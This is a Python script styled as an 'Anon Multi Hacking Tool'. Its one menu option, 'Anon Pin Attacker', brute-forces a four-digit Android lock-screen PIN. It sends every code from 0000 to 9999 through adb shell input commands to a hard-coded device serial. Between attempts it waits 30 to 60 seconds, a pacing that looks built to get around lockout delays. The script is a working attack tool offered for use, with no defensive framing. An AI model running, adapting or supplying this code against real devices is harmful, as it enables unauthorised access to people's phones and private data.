import os
import time
import pygetwindow as gw
import pyautogui
import sys

def maximize_window():
    window = gw.getActiveWindow()
    if window:
        window.maximize()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def countdown(seconds):
    for i in range(seconds, 0, -1):
        sys.stdout.write(f"\rWaiting: {i} sec")
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r")  # Clear the line after countdown
    sys.stdout.flush()

def brute_force_pin():
    clear_screen()
    print("""
                                _____ _                  _   _             _             
     /\                        |  __ (_)            /\  | | | |           | |            
    /  \   _ __   ___  _ __    | |__) | _ __       /  \ | |_| |_ __ _  ___| | _____ _ __ 
   / /\ \ | '_ \ / _ \| '_ \   |  ___/ | '_ \     / /\ \| __| __/ _` |/ __| |/ / _ \ '__|
  / ____ \| | | | (_) | | | |  | |   | | | | |   / ____ \ |_| || (_| | (__|   <  __/ |   
 /_/    \_\_| |_|\___/|_| |_|  |_|   |_|_| |_|  /_/    \_\__|\__\__,_|\___|_|\_\___|_|   
                                                                                         
                                                                                         
""")
    print("Start: press ENTER TWICE")
    print("Stop: Press CTRL+C")
    input("")

    # Define the range of PIN codes to try
    attempt_count = 0
    for pin in range(10000):  # 0000 - 9999
        pin_str = f"{pin:04d}"  # Ensure the PIN is 4 digits
        attempt_count += 1

        # Print the PIN trying message
        print(f"Trying PIN: {pin_str}")

        # Use adb to input the PIN
        os.system(f"adb -s RF8M53GLNRW shell input text {pin_str}")
        os.system("adb -s RF8M53GLNRW shell input keyevent 66")  # Press enter

        # Determine the wait time
        if attempt_count % 5 == 0:  # Every 5 attempts, add a longer delay
            wait_time = 60
        else:
            wait_time = 30

        # Countdown and wait
        countdown(wait_time)

def main_menu():
    print("""
 █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗    ███╗   ███╗██╗   ██╗██╗  ████████╗██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗     ████████╗ ██████╗  ██████╗ ██╗     
██╔══██╗████╗  ██║██╔═══██╗████╗  ██║    ████╗ ████║██║   ██║██║  ╚══██╔══╝██║    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝     ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
███████║██╔██╗ ██║██║   ██║██╔██╗ ██║    ██╔████╔██║██║   ██║██║     ██║   ██║    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗       ██║   ██║   ██║██║   ██║██║     
██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║    ██║╚██╔╝██║██║   ██║██║     ██║   ██║    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║       ██║   ██║   ██║██║   ██║██║     
██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║    ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                                                                                                                               
""")
    print("Options:")
    print("1. Anon Pin Attacker")
    print("-" * 50)
    choice = input("\nSelect an option: ")

    if choice == '1':
        clear_screen()
        maximize_window()
        brute_force_pin()
    else:
        print("Invalid option. Exiting...")

if __name__ == "__main__":
    maximize_window()
    main_menu()
